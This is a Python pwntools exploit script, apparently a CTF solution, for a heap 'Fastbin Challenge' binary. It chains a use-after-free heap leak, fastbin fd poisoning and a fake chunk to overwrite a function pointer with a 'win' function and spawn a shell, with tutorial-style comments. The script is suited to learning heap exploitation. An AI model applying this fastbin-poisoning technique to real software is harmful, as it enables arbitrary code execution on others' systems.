'''
Fastbin Challenge 
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name = '' #'/home/Desktop/tools/how2heap/glibc' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'happy'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 


def get_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", str(name))

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", str(name))
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def see_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

print("Step 1: heap leak")
print("=================")
'''
The main vulnerability is a use-after-free for the kids in the array. This same vulnerability can also be used for a double free scenario.

With the use after free, we can do the following things: 
- double free a kid 
- print the attributes of a kid 
- edit the kid

Interval 1...
'''

# Create three kids
get_kid("Maxwell", 5) # Index 0: Use for UAF later
get_kid("Maxwell2",6) # Index 1: Use for part of fake_chunk later.
get_kid("Maxwell3", 7) 
get_kid("Maxwell4", 8) 

# Free two of them. The key is that index 0 was freed second. So, it points to index 2's chunk. And (most importantly) it is accessible by us.
free_kid(2)
free_kid(0)

'''
Each struct looks like the following in memory: 
8 bytes (age) 
20 bytes (name) 
8 bytes (print_info) 

Once this struct is freed this will go into the fastbin (because of the small size, it goes into the 0x30 fastbin).

Recall that fastbins have an fd ptr (in the first part of the data of the chunk) that points to the next fastbin chunk...

So, this means that the first entry of the struct will have a fastbin ptr to the next entry (if it's not the last item in the list).

We use the UAF on the kid in order to print a heap address (fd of the fastbin chunk).
'''

name, age = see_kid(0)
leak = int(age)

# In order to get the top of the heap; the first 12 bits are always the same. So, we 0 these out to use for offsets later
leak = leak & 0xFFFFFFFFFFFFF000
print("Leaked heap address...", hex(leak))

# Interval 2 end

print("Step 2: Fake chunk Over Function Ptr")
print("====================================") 

'''
This could be done in the previous steps. But, for simplicity, we will recreate all of the chunks now.

Currently, the 'kid' at index 0 is freed (and writable). 
The 'age' field (also the fd pointer of the fastbin) leaks this pointer previously. 
However, if we can **overwrite** the fd pointer, we can **create** a fake chunk at most locations! 
	- Why most? The chunk size has to match the bin. So, we either have to control the content at this location or find something else that we can use.

Now, where is the best place to create a fake_chunk at? 
	- Well, the age struct has a beautiful function pointer that we can overwrite! 
	- So, let's create a fake chunk there! 

In order to make this possible, we need to have a chunk size that fits the bin (0x30).
	- So, we write a value of "\x30" in the 'name' (next to the function pointer)	

Once we have access to the fake chunk, write over the function pointer to the 'win' function for code execution!


Steps: 
- Overwrite kid 0's fd pointer to point to fake chunk 
- Create a fake chunk within one of the kids, that is close to the function pointer
- Get the fake chunk (by allocating memory)
- Write over the function pointer to point to 'win'.
- Profit :) 
'''

# Creating the fake_chunk 
fake_chunk = p64(0x0) # First, the prev_size is going to be 0 (not a needed field)
fake_chunk += p64(0x31) # Second, the size needs to be the same as the bin (0x30.

# The location to put the fake_chunk. This will be right next to the function pointer, in the struct.
edit_kid(1, fake_chunk, 0x0)

# Overwrite the fd pointer of the fastbin chunk to point to the fake_chunk (created in the previous line)
fake_chunk_ptr = leak + 0x48
edit_kid(0, "?", fake_chunk_ptr)

# The fake_chunk is in the second index of the linked list of the fastbin. So, remove the first one.
get_kid("A" * 8, 1)

# Get the fake_chunk (at the top of the fastbin)
# Also, the fake_chunk is right next to function_ptr of the 'kid' in index 1. 
# So, we write a new function ptr in order to pop a shell.
get_kid(p64(elf.symbols['win']), 2) 

print("Pop shell!")
# Print kid info option
p.sendlineafter('>', '2') 
# Index 1 has the overwritten function pointer. Pwned :)
p.sendlineafter(':', '1') 

p.interactive()
